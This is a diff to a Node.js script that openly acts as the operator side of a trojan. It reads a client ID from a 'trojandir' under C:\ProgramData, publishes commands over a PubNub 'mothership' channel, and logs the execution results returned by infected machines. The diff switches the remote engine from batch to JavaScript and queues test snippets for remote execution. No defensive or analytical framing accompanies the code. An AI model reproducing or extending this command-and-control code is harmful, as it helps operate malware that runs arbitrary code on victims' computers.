@@ -1,6 +1,7 @@
 import PubNub from 'pubnub';
 import fs from 'node:fs';
 import crypto from 'crypto';
+import path from 'path';
 
 function getRandomCode(n) {
     const min = Math.pow(10, n - 1);
@@ -17,7 +18,7 @@ function logmsg(msg) {
     console.log(msg);
 }
 
-const enginename = 'BAT';
+const enginename = 'JS'; // 'BAT'
 const trojandir = 'C:\\ProgramData\\owd\\';
 const clientid = fs.readFileSync(path.join(trojandir, 'client_id'), 'utf8');
 
@@ -39,10 +40,16 @@ var cmdresponse = null;
 var cmdresponses = [];
 
 subscription.onMessage = (messageEvent) => {
-    // logmsg("Message event: " + JSON.stringify(messageEvent));
     cmdresponse = messageEvent.message.execresult;
     cmdresponses.push(cmdresponse);
-    logmsg(cmdresponse);
+
+    let messagelog = '';
+
+    for (const [key, value] of Object.entries(messageEvent.message)) {
+        messagelog += ( key == 'execresult' ) ? '' : (`${key}: ${value}`) + '\r\n';
+    }
+
+    logmsg('\r\n' + messagelog + '\r\n---BEGIN---\r\n' + cmdresponse + '\r\n---END---\r\n');
 };
 
 subscription.subscribe();
@@ -90,17 +97,13 @@ async function sendCmd(cmdtext) {
 }
 
 async function publishMessage(payload) {
-    logmsg('starting');
     
     let res = await pubnub.publish({
         channel: mothership_channel,
         message: payload
     });
 
-    logmsg(JSON.stringify(payload));
-    console.log("Success! Timetoken:", res.timetoken);
-
-    logmsg('finished');
+    logmsg("message published -- timetoken: " + res.timetoken + ' payload: ' + JSON.stringify(payload));
 
     return res;
 }
@@ -116,12 +119,15 @@ function sleepSync(ms) {
 }
 
 var cmds = [];
-cmds.push('echo 1234');
-cmds.push('echo %DATE%');
-cmds.push('echo %TIME%');
-cmds.push('dir');
-
-cmds = cmds.toReversed();
+cmds.push(`let i = 0;`);
+cmds.push(`console.log('test 123450'); ${getRandomCode(8)}`);
+cmds.push(`console.log('test 123451 '+i); i++; ${getRandomCode(8)}`);
+cmds.push(`console.log('test 123452 '+i); i++; ${getRandomCode(8)}`);
+cmds.push(`console.log('test 123453 '+i); i++; ${getRandomCode(8)}`);
+cmds.push(`console.log('test 123454 '+i); i++; ${getRandomCode(8)}`);
+cmds.push(`console.log('test 123455 '+i); i++; ${getRandomCode(8)}`);
+cmds.push(`console.log('test 123456 '+i); i++; ${getRandomCode(8)}`);
+cmds.push(`console.log('test 123457 '+i); i++; ${getRandomCode(8)}`);
 
 for ( let i = 0; i<cmds.length; i++) {
     let cmdtext = cmds[i];
